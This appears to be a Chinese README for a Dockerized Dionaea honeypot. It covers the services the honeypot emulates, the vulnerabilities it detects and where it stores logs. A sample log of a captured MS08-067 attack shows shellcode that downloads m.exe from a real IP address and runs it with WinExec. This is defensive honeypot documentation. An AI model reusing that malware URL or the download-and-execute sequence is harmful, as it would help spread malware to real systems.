# dockerized dionaea
一、项目介绍

此项目是将dionaea制作成docker镜像，包含定制该蜜罐的配置文件以及build docker镜像的Dockerfile。
此项目作为多蜜罐项目 **[Multi-Honeypots]** 的一个蜜罐部件。


二、Dionaea蜜罐介绍
[dionaea](https://github.com/DinoTools/dionaea) 是一个低交互服务型蜜罐，
通过fake常用的服务，开放相应的端口吸引攻击记者进行攻击，并记录攻击过程
主要开启的服务包括：
epmap  
ftp
http
memcache
mirror
mqtt
mssql
mysql
pptp
sip
smb
tftp
upnp

主要还是针对RPC服务的模拟和攻击捕获，系统指纹主要包括：

 1:"Windows XP Service Pack 0/1",
 2:"Windows XP Service Pack 2",
 3:"Windows XP Service Pack 3",
 4:"Windows 7 Service Pack 1",
 5:"Linux Samba 4.3.11"
 
默认是2类型的系统指纹，可在配置文件里进行更改。
识别的漏洞类型：
MS08-067（SRVSVC）
MS03-26（DCOM）
MS04-11 （DSSETUP）
MS04-12（ISystemActivator）
MS07-065 
MS05-017（MSMQ）
MS04-031（nddeapi）
MS06-66（NWWKS）
MS05-39（PNP）
MS03-39（WKSSVC）


对于exploitation的过程：

1）shellcode的检测和分析，主要利用libemu模块记录API调用，参数传递过程，
   并做出相应的action。对于需要multi-stage shellcode，不对接收的shellcode
   记录API调用，而是直接执行，做出相应的action。
2）payload：接收到payloads，猜测意图，做出响应
   ① Shells - bind/connectback：返回一个cmd.exe给攻击者，解析输入做出响应
   ② URLDownloadToFile：使用URLDownloadToFile API下载文件并执行。
   ③ Exec:调用WinExec执行命令
   ④ Multi Stage Payloads：在libemu虚拟环境里执行
3）根据下载的URL启用tftp和ftp下载，但是不能抓到嵌在恶意样本里的下载行为或
   启用ftp.exe下载的行为。可以保存恶意样本至本地，或http/post至CWSandbox, 
   Norman Sandbox or VirusTotal

三、威胁数据存储

所有数据存储至/data/dionaea/ 目录下
日志主要输出为json格式和sqlite数据库形式，分别保存至/data/dionaea/log/dionaea.json /data/dionaea/log/dionaea.sqlite，
json日志记录连接情况，sqlite记录攻击细节（sql语句，smb漏洞利用等等）
下载的恶意样本保存至/data/dionaea/binaries 下以哈希值重命名
捕获的数据流保存至/data/dionaea/bistreams
为避免磁盘空间占用过大，多蜜罐系统默认24小时重启一次，且重启后清除
/data/下的数据，并在清除之前将所有数据导入到已部署的MySQL数据库中，
样本打包发送至FTP server或SMB server中

四、威胁事件记录结构

单次完整的攻击过程，在dionaea.sqlite中记录如下：
2010-10-07 20:37:27
connection 483256 smbd tcp accept 10.0.1.11:445 <- 93.177.176.190:47650 (483256 None)
dcerpc bind: 
uuid ‘4b324fc8-1670-01d3-1278-5a47bf6ee188’ (SRVSVC) transfersyntax 8a885d04-1ceb-11c9-9fe8-08002b104860 
dcerpc bind: uuid ‘7d705026-884d-af82-7b3d-961deaeb179a’ (None) transfersyntax 8a885d04-1ceb-11c9-9fe8-08002b104860 
dcerpc bind: uuid ‘7f4fdfe9-2be7-4d6b-a5d4-aa3c831503a1’ (None) transfersyntax 8a885d04-1ceb-11c9-9fe8-08002b104860 
dcerpc bind: uuid ‘8b52c8fd-cc85-3a74-8b15-29e030cdac16’ (None) transfersyntax 8a885d04-1ceb-11c9-9fe8-08002b104860 
dcerpc bind: uuid ‘9acbde5b-25e1-7283-1f10-a3a292e73676’ (None) transfersyntax 8a885d04-1ceb-11c9-9fe8-08002b104860 
dcerpc bind: uuid ‘9f7e2197-9e40-bec9-d7eb-a4b0f137fe95’ (None) transfersyntax 8a885d04-1ceb-11c9-9fe8-08002b104860 
dcerpc bind: uuid ‘a71e0ebe-6154-e021-9104-5ae423e682d0’ (None) transfersyntax 8a885d04-1ceb-11c9-9fe8-08002b104860 
dcerpc bind: uuid ‘b3332384-081f-0e95-2c4a-302cc3080783’ (None) transfersyntax 8a885d04-1ceb-11c9-9fe8-08002b104860 
dcerpc bind: uuid ‘c0cdf474-2d09-f37f-beb8-73350c065268’ (None) transfersyntax 8a885d04-1ceb-11c9-9fe8-08002b104860 
dcerpc bind: uuid ‘d89a50ad-b919-f35c-1c99-4153ad1e6075’ (None) transfersyntax 8a885d04-1ceb-11c9-9fe8-08002b104860 
dcerpc bind: uuid ‘ea256ce5-8ae1-c21b-4a17-568829eec306’ (None) transfersyntax 8a885d04-1ceb-11c9-9fe8-08002b104860 
dcerpc request: uuid ‘4b324fc8-1670-01d3-1278-5a47bf6ee188’ (SRVSVC) opnum 31 (NetPathCanonicalize (**[MS08-67]**))

 profile: {
	‘return’: ‘0x7df20000’,
	‘args’: [‘urlmon’],
	‘call’: ‘LoadLibraryA’
}, {
	‘return’: ‘0’,
	‘args’: [‘’, ‘http: //208.53.183.158/m.exe‘, ‘60.exe’, ‘0’, ‘0’], ‘call’: ‘URLDownloadToFile’}, {‘return’: ‘32’, ‘args’: [‘60.exe’, ‘895’], ‘call’: ‘WinExec’}, {‘return’: ‘0’, ‘args’: [‘-1’], ‘call’: ‘Sleep’]} 

offer: hxxp://208.53.183.158/m.exe download: 3eab379ddac7d80d3e38399fd273ddd4 hxxp://208.53.183.158/m.exe

其他详情可参考：https://dionaea.readthedocs.io/en/latest/configuration.html

附在公网上90天dionaea捕获到的威胁数据统计报告dashboard
![Dionaea Dashboard](https://raw.githubusercontent.com/douwanhu/docker-dionaea/master/doc/dashboard.png)

